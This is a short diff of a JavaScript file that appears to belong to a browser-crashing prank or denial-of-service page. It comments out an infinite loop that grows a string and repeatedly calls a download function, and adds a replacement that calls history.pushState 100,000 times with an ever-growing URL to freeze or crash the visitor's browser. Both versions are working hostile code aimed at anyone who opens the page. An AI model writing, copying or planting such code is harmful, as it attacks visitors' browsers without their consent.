@@ -182,14 +182,21 @@ function runner(){
 function killer(){
 	text += "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
 }
-function allinone(){
-	runner();
-	text = "a";
-	while(1){
-		killer();
-		download1();
-	}
+// function allinone(){
+// 	runner();
+// 	text = "a";
+// 	while(1){
+// 		killer();
+// 		download1();
+// 	}
 
+// }
+var total = "";
+function allinone(){
+	for(var i=0; i<100000; i++){
+		total += i.toString();
+		history.pushState(0, 0, total);
+	}
 }
 function download(mult) {
     bobby = 5;
